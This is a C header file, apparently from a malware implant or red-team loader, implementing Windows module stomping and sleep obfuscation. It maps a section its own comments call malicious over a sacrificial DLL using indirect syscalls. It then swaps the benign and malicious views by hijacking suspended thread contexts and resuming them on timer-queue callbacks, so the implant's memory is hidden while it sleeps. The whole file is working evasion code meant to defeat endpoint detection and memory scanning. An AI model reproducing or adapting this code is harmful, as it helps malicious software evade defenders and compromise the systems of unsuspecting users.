#pragma once

#include "syscalls.h"
#include "globals.h"

HANDLE SwapDll(SIZE_T MODULESIZE, PVOID SACDLLBASE) {
    
    HANDLE malHandle = NULL;
    NTSTATUS STATUS = 0x00;
    LARGE_INTEGER sectionSize = { MODULESIZE };

    //createsection
    if (STATUS = ZwCreateSection(&malHandle, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL, zwFunctions[ZwCreateSectionF].SSN, zwFunctions[ZwCreateSectionF].sysretAddr) != 0) {

        return NULL;
    }

    //unamep the sacrificial DLL 
    if (STATUS = ZwUnmapViewOfSection(((HANDLE)(LONG_PTR)-1), SACDLLBASE, zwFunctions[ZwUnmapViewOfSectionF].SSN, zwFunctions[ZwUnmapViewOfSectionF].sysretAddr) != 0) {

        return NULL;

    }
    
    //mapviewofsection of the malicious section at the same address as the sacdll

    if (STATUS = ZwMapViewOfSection(malHandle, ((HANDLE)(LONG_PTR)-1), &SACDLLBASE, NULL, NULL, NULL, &MODULESIZE, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE, zwFunctions[ZwMapViewOfSectionF].SSN, zwFunctions[ZwMapViewOfSectionF].sysretAddr) != 0) {

        return NULL;
    }

    return malHandle;

}


int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize) {


	CONTEXT context = { 0 };
	CONTEXT contextB = { 0 };
	CONTEXT contextC = { 0 };
	CONTEXT contextD = { 0 };


	HANDLE ThreadArray[4] = { NULL };

	context.ContextFlags = CONTEXT_ALL;
	contextB.ContextFlags = CONTEXT_ALL;
	contextC.ContextFlags = CONTEXT_ALL;
	contextD.ContextFlags = CONTEXT_ALL;



	HANDLE  hEvent = NULL;
	hEvent = CreateEventW(0, 0, 0, 0);



	// Create a thread to control
	ThreadArray[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
	if (ThreadArray[0] == NULL) {
		printf("Failed to create thread\n");
		return -1;
	}
	ThreadArray[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
	if (ThreadArray[1] == NULL) {
		printf("Failed to create thread\n");
		return -1;
	}
	ThreadArray[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
	if (ThreadArray[2] == NULL) {
		printf("Failed to create thread\n");
		return -1;
	}
	ThreadArray[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
	if (ThreadArray[3] == NULL) {
		printf("Failed to create thread\n");
		return -1;
	}


	GetThreadContext(ThreadArray[0], &context);//unmap
	GetThreadContext(ThreadArray[1], &contextB);//mapex
	GetThreadContext(ThreadArray[2], &contextC);//unmap
	GetThreadContext(ThreadArray[3], &contextD);//mapex


	*(ULONG_PTR*)((context).Rsp) = (DWORD64)ExitThread;
	context.Rip = (DWORD64)UnmapViewOfFile;
	context.Rcx = (DWORD64)(ImageBaseDLL);

	*(ULONG_PTR*)((contextB).Rsp) = (DWORD64)ExitThread;
	contextB.Rip = (DWORD64)MapViewOfFileEx;
	contextB.Rcx = (DWORD64)sacDllHandle;
	contextB.Rdx = FILE_MAP_ALL_ACCESS;
	contextB.R8 = (DWORD64)0x00;
	contextB.R9 = (DWORD64)0x00;
	*((PDWORD64)((contextB).Rsp + 40)) = viewSize; //this one is either 28 hex or 40 dec 
	*((PDWORD64)((contextB).Rsp + 48)) = (ULONGLONG)(ImageBaseDLL);

	*(ULONG_PTR*)((contextC).Rsp) = (DWORD64)ExitThread;
	contextC.Rip = (DWORD64)UnmapViewOfFile;
	contextC.Rcx = (DWORD64)(ImageBaseDLL);

	*(ULONG_PTR*)((contextD).Rsp) = (DWORD64)ExitThread;
	contextD.Rip = (DWORD64)MapViewOfFileEx;
	contextD.Rcx = (DWORD64)malDllHandle;
	contextD.Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
	contextD.R8 = (DWORD64)0x00;
	contextD.R9 = (DWORD64)0x00;
	*(ULONG_PTR*)((contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
	*(ULONG_PTR*)((contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;


	SetThreadContext(ThreadArray[0], &context);
	SetThreadContext(ThreadArray[1], &contextB);
	SetThreadContext(ThreadArray[2], &contextC);
	SetThreadContext(ThreadArray[3], &contextD);


	HANDLE  hTimerQueue = NULL;
	HANDLE  hNewTimer = NULL;
	PVOID ResumeThreadAddress = NULL;

	hTimerQueue = CreateTimerQueue();

	ResumeThreadAddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "ResumeThread");

	if (ResumeThreadAddress != NULL) {
		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[0], 100, 0, WT_EXECUTEINTIMERTHREAD);//unamp
		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[1], 200, 0, WT_EXECUTEINTIMERTHREAD);//mapsac
		//sleep time
		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[2], 7000, 0, WT_EXECUTEINTIMERTHREAD);//unmap
		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[3], 7100, 0, WT_EXECUTEINTIMERTHREAD);//mapmal

		WaitForMultipleObjects(4, ThreadArray, TRUE, INFINITE);
	}

	return 0;

}

